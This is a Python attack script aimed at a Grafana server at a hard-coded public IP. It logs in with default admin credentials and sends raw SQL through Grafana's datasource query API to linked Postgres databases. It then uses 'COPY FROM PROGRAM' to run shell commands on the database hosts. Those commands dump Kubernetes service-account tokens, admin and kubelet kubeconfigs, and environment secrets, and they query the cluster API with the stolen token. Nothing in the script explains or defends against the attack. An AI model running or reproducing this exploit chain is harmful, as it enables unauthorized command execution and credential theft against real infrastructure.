import json,os,time
import requests, urllib3
urllib3.disable_warnings()
BASE='http://117.148.167.134:3000'
OUT=os.environ.get('OUT','i4443/out5'); os.makedirs(OUT,exist_ok=True)
S=requests.Session(); S.auth=('admin','admin'); S.verify=False
S.headers.update({'User-Agent':'ul-i4443','Connection':'close'})
logf=open(os.path.join(OUT,'requests.log'),'w')
def L(*a):
    m=' '.join(str(x) for x in a); print(m,flush=True); logf.write(m+'\n'); logf.flush()
def req(method,path,**kw):
    to=kw.pop('timeout',20); tries=kw.pop('tries',3)
    for i in range(tries):
        try: return S.request(method,BASE+path,timeout=to,**kw)
        except Exception as e:
            L('retry',i,path,type(e).__name__,e); time.sleep(1)
    return None
def save(name,r):
    if r is None: open(os.path.join(OUT,name+'.err'),'w').write('FAILED'); L('[ERR]',name); return None
    b=r.content; open(os.path.join(OUT,name+'.raw'),'wb').write(b)
    open(os.path.join(OUT,name+'.json'),'w').write(json.dumps({'status':r.status_code,'len':len(b),'body':b.decode('utf-8','replace')[:400000]},ensure_ascii=False))
    L('[%d] %s len=%d'%(r.status_code,name,len(b))); return r
def dsq(uid,sql,label,tries=3,timeout=25):
    body={"queries":[{"refId":"A","datasource":{"type":"postgres","uid":uid},"rawSql":sql,"format":"table","intervalMs":60000,"maxDataPoints":500}],"from":"now-1h","to":"now"}
    r=req('POST','/api/ds/query',json=body,timeout=timeout,tries=tries)
    return save(label,r)
def rows_of(r):
    out=[]
    try:
        j=json.loads(r.content)
        for fr in j['results']['A']['frames']:
            for v in fr['data']['values']: out+= [str(x) for x in v]
    except Exception as e: L('parse',e)
    return out
CANDS=[('hk134orca','c99c8146-6ad2-42ef-a90e-548c4421c547','117.148.167.134:5432'),
       ('hk132orca','b5e550ac-aca4-41b5-a1bd-f4ec969cfc6a','117.148.167.132:5432'),
       ('t19pgdev','ec254b42-987b-45cc-a237-af69be521f1d','postgresql-dev:5432')]
good=None
for nm,uid,url in CANDS:
    r=dsq(uid,"SELECT version() AS v,current_user AS u,current_database() AS db,inet_server_addr()::text AS a",f"00_{nm}_ver")
    if r is not None:
        b=r.content.decode('utf-8','replace')
        L(nm,url,r.status_code,b[:300].replace('\n',' '))
        try:
            j=json.loads(b)
            if j['results']['A'].get('frames'): good=(nm,uid); L('HEALTHY',nm); break
        except Exception: pass
if good:
    nm,uid=good
    def run(shell,label):
        dsq(uid,"DROP TABLE IF EXISTS ulout",label+'_drop',tries=2,timeout=20)
        dsq(uid,"CREATE TEMP TABLE ulout(x text)",label+'_mk',tries=2,timeout=20)
        shell2=shell.replace("'","'\\''")
        r=dsq(uid,f"COPY ulout FROM PROGRAM '{shell2}'",label+'_copy',tries=2,timeout=30)
        rr=dsq(uid,"SELECT * FROM ulout",label+'_read',tries=2,timeout=30)
        rows=rows_of(rr) if rr is not None else []
        open(os.path.join(OUT,label+'.txt'),'w').write('\n'.join(rows)); L(label,'rows',len(rows))
        return rows
    run("id; hostname; uname -m; cat /proc/1/cgroup; cat /etc/hostname; head -3 /etc/os-release; ls -l /dev/nvidia* 2>&1; nvidia-smi -L 2>&1; ip -br a 2>&1; cat /etc/hosts","10_sys")
    run("cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 | head -c 3000; echo; echo NS:; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1; echo; echo ADM:; cat /etc/kubernetes/admin.conf 2>&1 | head -50; echo; echo KUBE:; cat /root/.kube/config 2>&1 | head -50; echo; echo KUBELET:; cat /var/lib/kubelet/kubeconfig 2>&1 | head -40","11_creds")
    run("curl -sk -m6 https://127.0.0.1:10250/healthz 2>&1|head -2; echo ---; TOK=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); curl -sk -m8 -H \"Authorization: Bearer $TOK\" https://kubernetes.default.svc/version 2>&1|head -c 400; echo; echo ---; curl -sk -m8 -H \"Authorization: Bearer $TOK\" https://kubernetes.default.svc/api/v1/nodes?limit=20 2>&1|head -c 800; echo; echo ---; which kubectl; kubectl get nodes 2>&1|head -6","12_cluster")
    run("ss -lntp 2>&1|head -30; echo ---; env|sort|grep -iE 'kube|postgres|token|secret|harbor|s3|aws|oss|mongo'|head -30","13_net")
# datasources refresh last
r=req('GET','/api/datasources',timeout=45,tries=3)
save('90_datasources',r)
L('DONE')
